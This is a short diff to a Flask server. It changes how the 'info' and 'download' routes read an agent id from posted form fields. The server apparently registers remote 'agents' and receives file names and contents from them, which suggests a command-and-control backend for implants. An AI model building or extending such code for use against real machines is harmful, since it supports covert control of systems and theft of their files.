@@ -149,7 +149,12 @@ def payloadjfs():
 def info():
     global COUNT
     data = request.form['data']
-    id= request.form['image']
+    #id= request.form['image']
+    for i in request.form:
+        if i=='data' :
+            continue
+        else:
+            id=request.form[i]
     #request.args.get('page')
     if AGENTS.get(id) == None and data != None:
         data = data.split('**')
@@ -258,7 +263,7 @@ def sct(request):
 @app.route(download_url, methods=["POST"])
 def download():
     data = request.form['d']
-    id= request.form['d']
+    id= request.form['resource']
     if AGENTS.get(id) != None and data != None:
         filename=request.form['f']
         filecontent=request.form['d']
